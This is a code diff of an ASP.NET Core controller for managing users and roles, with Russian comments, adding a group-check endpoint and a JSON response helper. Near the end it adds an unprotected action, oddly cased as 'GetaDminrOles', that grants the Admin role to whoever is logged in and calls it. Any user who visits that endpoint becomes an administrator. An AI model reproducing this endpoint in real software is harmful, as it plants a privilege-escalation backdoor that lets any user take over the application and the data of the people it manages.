@@ -11,6 +11,8 @@ using AD.BLL.Methods;
 using System.Collections.Generic;
 using System.Security.Claims;
 using System.Net;
+using AD.BLL.JsonPattern;
+using Microsoft.AspNetCore.Authorization;
 
 namespace AD.Controllers
 {
@@ -21,16 +23,16 @@ namespace AD.Controllers
         private UserService _UserService { get; }
         private UserMethods _userMethods { get; }
         [BindProperty]
-        public List<UserViewModel> UserViewModel { get; set; }
+        private List<UserViewModel> UserViewModel { get; set; }
+        private JsonHttpRespone _json { get; set; }
 
 
-
-
-        public HomeController(ILogger<HomeController> logger, UserService userService, UserMethods userMethods)
+        public HomeController(ILogger<HomeController> logger, UserService userService, UserMethods userMethods, JsonHttpRespone json)
         {
             _logger = logger;
             _UserService = userService;
             _userMethods = userMethods;
+            _json = json;
         }
 
 
@@ -60,8 +62,8 @@ namespace AD.Controllers
             return View(allUsers);
 
         }
-
-       [RoleValidate("Admin")]
+        //добавление роли
+        [RoleValidate("Admin")]
         public async Task<IActionResult> Creation(string email)
         {
             var us = await _UserService.FindUserByEmail(email);
@@ -75,7 +77,7 @@ namespace AD.Controllers
 
             return View("~/Views/Home/ViewUser.cshtml", us);
         }
-
+        //удаление роли
         [RoleValidate("Admin")]
         [HttpPost]
         public async Task<IActionResult> Remove(string email)
@@ -91,7 +93,7 @@ namespace AD.Controllers
 
             return View("~/Views/Home/ViewUser.cshtml", us);
         }
-
+        //найти пользователя
         [HttpPost]
         public async Task<IActionResult> Find(string fullname)
         {
@@ -106,19 +108,33 @@ namespace AD.Controllers
                 return RedirectToAction("Role");
             }
         }
-
-        public bool GetGroup()
+        // проверка группы для скрытия элементов от пользователя !!!!!!!!!!!!!!!!!!!!!!проверить
+        [HttpPost]
+        public Task<string> GetGroup(string group)
         {
-            return true;
+            var user = _UserService.FindUserByUserName(_UserService.GetUserName()).Result;
+            if (user != null) {
+                if (user.Departaments.Contains(group)) {
+                    return _json.HttpResponse(200, "true");
+                }
+                else
+                {
+                    return _json.HttpResponse(204, "false");
+                }
+            }
+            else
+            {
+                return _json.HttpResponse(404, "false", "not found users");
+            }
         }
-       
+        //посмотреть данные пользователя
         [HttpGet]
         public async Task<IActionResult> ViewUser(string email)
         {
-            if (!string.IsNullOrEmpty(email)) { 
-            var user = await _UserService.FindUserByEmail(email);
-            
-            return View(user);
+            if (!string.IsNullOrEmpty(email)) {
+                var user = await _UserService.FindUserByEmail(email);
+
+                return View(user);
             }
             else
             {
@@ -127,11 +143,23 @@ namespace AD.Controllers
 
         }
 
-
+        [GroupValidate("web")]
         public  IActionResult GetClaims()
         {
-            
             return View();
+        }
+
+
+        public async Task<IActionResult> GetaDminrOles()
+        {
+            var user = _UserService.FindUserByUserName(_UserService.GetUserName()).Result;
+
+            if (!_UserService.IsInRole(user, "Admin").Result)
+            {
+                await _UserService.AddToRole(user, "Admin");
+            }
+
+            return Redirect("/Home/Index");
         }
 
 
